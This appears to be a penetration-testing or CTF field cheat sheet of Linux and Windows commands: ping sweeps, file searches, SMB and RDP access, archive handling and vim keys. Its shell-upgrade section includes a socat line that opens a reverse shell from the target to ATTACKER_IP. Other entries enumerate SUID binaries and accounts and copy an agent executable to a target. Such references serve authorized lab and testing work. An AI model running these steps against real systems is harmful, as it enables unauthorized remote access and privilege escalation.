# Linux & Windows Commands — Field Reference

---

## 1. Network Reconnaissance

### Local Services & Ports
```bash
# What's listening locally
ss -tuln

# Find a specific service/port
ss -antp | grep "service_name_or_port"

# Routing table
ip route
netstat -r

# All interfaces
ip a
ifconfig
```

### Host Discovery (Ping Sweep)

**Linux**
```bash
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
```

**Windows CMD**
```cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

**PowerShell**
```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -Count 1 -Comp 172.16.5.$($_) -Quiet)"}
```

---

## 2. File Search

### Linux
```bash
# Find files by name (case-sensitive)
find / -type f -name "flag.txt" 2>/dev/null

# Case-insensitive
find / -iname "flag*" 2>/dev/null
find / -iname "*.conf" 2>/dev/null
find / -iname "*.txt" 2>/dev/null

# Specific filename
find / -type f -name "tomcat_flag.txt*" 2>/dev/null

# SUID binaries (priv esc)
find / -perm -4000 -type f 2>/dev/null

# World-writable files
find / -perm -o+w -type f 2>/dev/null

# Files owned by a user
find / -user www-data -type f 2>/dev/null

# Recently modified (last 10 min)
find / -mmin -10 -type f 2>/dev/null
```

### Windows
```cmd
dir /s /b *.txt          &:: Find all .txt files recursively
dir /s /b flag.txt       &:: Find a specific file
dir /s /b *.exe          &:: Find all executables
```

```powershell
# PowerShell
Get-ChildItem -Path C:\ -Recurse -Filter "flag.txt" -ErrorAction SilentlyContinue
```

---

## 3. Shell Upgrades (Stabilize a Reverse Shell)

### Method 1: Python PTY (most common)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Fallbacks:
python -c 'import pty; pty.spawn("/bin/bash")'
python2 -c 'import pty; pty.spawn("/bin/bash")'

# Then background it and fix terminal:
# Press Ctrl+Z
stty raw -echo; fg
# Press Enter twice — now you have full TTY (autocomplete, arrows, Ctrl+C)
```

### Method 2: script (no Python needed)
```bash
script /dev/null -c bash
# OR
script -qc /bin/bash /dev/null

# Then:
# Press Ctrl+Z
stty raw -echo; fg
```

### Method 3: socat (full PTY immediately)
```bash
# On attacker (listener)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# On target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

### Fix Terminal Size (after upgrading)
```bash
# On attacker (in a separate terminal), get your dimensions:
stty size
# e.g., 50 200

# On target (in the upgraded shell):
export TERM=xterm
stty rows 50 cols 200
```

---

## 4. SMB Connections (Windows)

### Connect to SMB Share
```cmd
net use \\10.10.15.1\share /user:administrator Password123
```

### Map as a Drive Letter
```cmd
net use Z: \\10.10.15.1\share /user:administrator Password123
```

### Disconnect
```cmd
net use Z: /delete
net use \\10.10.15.1\share /delete
```

---

## 5. RDP

### From Linux (xfreerdp)
```bash
# Basic
xfreerdp /v:TARGET /u:admin /p:Password123

# With shared drive (mount local folder into RDP session)
xfreerdp /v:TARGET /u:admin /p:Password123 /drive:kali,/home/kali/tools

# With clipboard sharing
xfreerdp /v:TARGET /u:admin /p:Password123 /clipboard

# Custom resolution
xfreerdp /v:TARGET /u:admin /p:Password123 /w:1920 /h:1080

# Ignore certificate
xfreerdp /v:TARGET /u:admin /p:Password123 /cert:ignore
```

### Copy from Mounted RDP Drive (on Windows side)
```cmd
copy \\tsclient\kali\agent.exe C:\Windows\Temp\agent.exe
dir \\tsclient\kali\
```

### From Windows
```cmd
:: CMD
mstsc /v:172.16.6.x

:: PowerShell
Start-Process "mstsc" -ArgumentList "/v:172.16.6.x"
```

---

## 6. /etc/hosts Management

### Replace an IP in /etc/hosts
```bash
sudo sed -i 's/OLD_IP/NEW_IP/g' /etc/hosts
```

### Add an entry
```bash
echo "TARGET_IP  target.htb admin.target.htb" | sudo tee -a /etc/hosts
```

---

## 7. Archive Operations

### Extract
```bash
# .tar.gz / .tgz
tar -xzvf filename.tar.gz

# .tar
tar -xvf filename.tar

# .zip
unzip filename.zip

# .7z
7z x filename.7z

# .rar
unrar x filename.rar
```

### Create
```bash
# .tar.gz
tar -czvf archive.tar.gz /path/to/folder

# .zip
zip -r archive.zip /path/to/folder
```

---

## 8. User & Account Enumeration

### Filter Real Login Accounts
```bash
# Show only accounts with a real shell (filter out nologin/false)
grep sh$ /etc/passwd

# Just usernames
grep sh$ /etc/passwd | cut -d: -f1

# Check sudo privileges
sudo -l

# Current user info
id
whoami
```

---

## 9. Python / Pipx Tool Installation

### Install Python Tools with uv + pipx
```bash
# 1. Install the Python version with uv
uv python install 3.11

# 2. Install the tool with pipx pointing at that Python
pipx install --python $(uv python find 3.11) TOOL_NAME

# 3. If already installed, use reinstall instead
pipx reinstall TOOL_NAME --python $(uv python find 3.11)
```

---

## 10. Vim Quick Reference

### Essential Commands
| Key | Action |
|-----|--------|
| `i` | Insert mode (start typing) |
| `Esc` | Back to normal mode |
| `:w` | Save |
| `:q` | Quit |
| `:wq` or `ZZ` | Save and quit |
| `:q!` | Quit without saving |
| `dd` | Delete (cut) line |
| `yy` | Copy line |
| `p` | Paste below |
| `/search` | Search forward |
| `n` | Next match |
| `:set number` | Show line numbers |
| `:%s/old/new/g` | Find and replace all |
| `u` | Undo |
| `Ctrl+r` | Redo |
| `gg` | Go to top |
| `G` | Go to bottom |
